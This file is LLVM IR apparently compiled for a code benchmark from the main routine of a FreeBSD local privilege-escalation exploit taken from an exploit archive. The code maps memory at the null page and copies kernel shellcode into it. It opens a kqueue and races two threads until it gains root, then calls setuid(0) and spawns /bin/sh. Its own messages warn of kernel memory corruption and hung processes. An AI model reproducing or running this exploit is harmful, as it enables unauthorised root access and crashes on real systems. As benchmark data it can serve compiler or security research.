; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_9859.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_9859.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i64 }

@.str = private unnamed_addr constant [15 x i8] c"already root.\0A\00", align 1
@.str.1 = private unnamed_addr constant [244 x i8] c"BEWARE! this exploit isn't 100%% reliable. successful exploitation\0Amay cause kernel memory corruption leading to system crash.\0Ait is also possible, that exploit will hang and such process\0Awill be unkillable. hit enter if you want to continue.\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@kernel_code = common dso_local global i32 0, align 4
@code_end = common dso_local global i32 0, align 4
@kq = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [7 x i8] c"kqueue\00", align 1
@do_thread = common dso_local global i64 0, align 8
@do_thread2 = common dso_local global i64 0, align 8
@timeout = common dso_local global %struct.TYPE_2__ zeroinitializer, align 8
@.str.4 = private unnamed_addr constant [92 x i8] c"waiting for root... it should take no more than few seconds.\0Aotherwise, run exploit again.\0A\00", align 1
@gotroot = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [83 x i8] c"failed. on unpatched systems, the exploit will be unkillable from now. try again.\0A\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %5 = call i64 (...) @getuid()
  %6 = icmp ne i64 %5, 0
  br i1 %6, label %7, label %10

7:                                                ; preds = %0
  %8 = call i32 (...) @geteuid()
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %13, label %10

10:                                               ; preds = %7, %0
  %11 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 @exit(i32 -1) #3
  unreachable

13:                                               ; preds = %7
  %14 = call i32 @printf(i8* getelementptr inbounds ([244 x i8], [244 x i8]* @.str.1, i64 0, i64 0))
  %15 = call i32 (...) @getchar()
  %16 = load i32, i32* @PROT_READ, align 4
  %17 = load i32, i32* @PROT_WRITE, align 4
  %18 = or i32 %16, %17
  %19 = load i32, i32* @PROT_EXEC, align 4
  %20 = or i32 %18, %19
  %21 = load i32, i32* @MAP_ANON, align 4
  %22 = load i32, i32* @MAP_FIXED, align 4
  %23 = or i32 %21, %22
  %24 = call i64 @mmap(i8* inttoptr (i64 1082851328 to i8*), i32 16384, i32 %20, i32 %23, i32 -1, i32 0)
  %25 = icmp slt i64 %24, 0
  br i1 %25, label %26, label %29

26:                                               ; preds = %13
  %27 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %28 = call i32 @exit(i32 -1) #3
  unreachable

29:                                               ; preds = %13
  %30 = load i32, i32* @PROT_READ, align 4
  %31 = load i32, i32* @PROT_WRITE, align 4
  %32 = or i32 %30, %31
  %33 = load i32, i32* @PROT_EXEC, align 4
  %34 = or i32 %32, %33
  %35 = load i32, i32* @MAP_ANON, align 4
  %36 = load i32, i32* @MAP_FIXED, align 4
  %37 = or i32 %35, %36
  %38 = call i64 @mmap(i8* null, i32 4096, i32 %34, i32 %37, i32 -1, i32 0)
  %39 = icmp slt i64 %38, 0
  br i1 %39, label %40, label %43

40:                                               ; preds = %29
  %41 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %42 = call i32 @exit(i32 -1) #3
  unreachable

43:                                               ; preds = %29
  %44 = call i32 @memcpy(i32 0, i32* @kernel_code, i32 trunc (i64 sdiv exact (i64 sub (i64 ptrtoint (i32* @code_end to i64), i64 ptrtoint (i32* @kernel_code to i64)), i64 4) to i32))
  %45 = call i32 (...) @kqueue()
  store i32 %45, i32* @kq, align 4
  %46 = icmp slt i32 %45, 0
  br i1 %46, label %47, label %50

47:                                               ; preds = %43
  %48 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %49 = call i32 @exit(i32 -1) #3
  unreachable

50:                                               ; preds = %43
  %51 = load i64, i64* @do_thread, align 8
  %52 = inttoptr i64 %51 to i8*
  %53 = call i32 @pthread_create(i32* %3, i32* null, i8* %52, i32* null)
  %54 = load i64, i64* @do_thread2, align 8
  %55 = inttoptr i64 %54 to i8*
  %56 = call i32 @pthread_create(i32* %4, i32* null, i8* %55, i32* null)
  store i64 0, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @timeout, i32 0, i32 1), align 8
  store i32 1, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @timeout, i32 0, i32 0), align 8
  %57 = call i32 @printf(i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %2, align 4
  br label %58

58:                                               ; preds = %67, %50
  %59 = load i32, i32* @gotroot, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %65, label %61

61:                                               ; preds = %58
  %62 = load i32, i32* %2, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %2, align 4
  %64 = icmp slt i32 %62, 4000
  br label %65

65:                                               ; preds = %61, %58
  %66 = phi i1 [ false, %58 ], [ %64, %61 ]
  br i1 %66, label %67, label %69

67:                                               ; preds = %65
  %68 = call i32 @usleep(i32 100)
  br label %58

69:                                               ; preds = %65
  %70 = call i32 @setuid(i32 0)
  %71 = call i64 (...) @getuid()
  %72 = icmp ne i64 %71, 0
  br i1 %72, label %73, label %76

73:                                               ; preds = %69
  %74 = call i32 @printf(i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.5, i64 0, i64 0))
  %75 = call i32 @exit(i32 -1) #3
  unreachable

76:                                               ; preds = %69
  %77 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32* null)
  ret i32 0
}

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @geteuid(...) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @getchar(...) #1

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memcpy(i32, i32*, i32) #1

declare dso_local i32 @kqueue(...) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i8*, i32*) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @setuid(i32) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
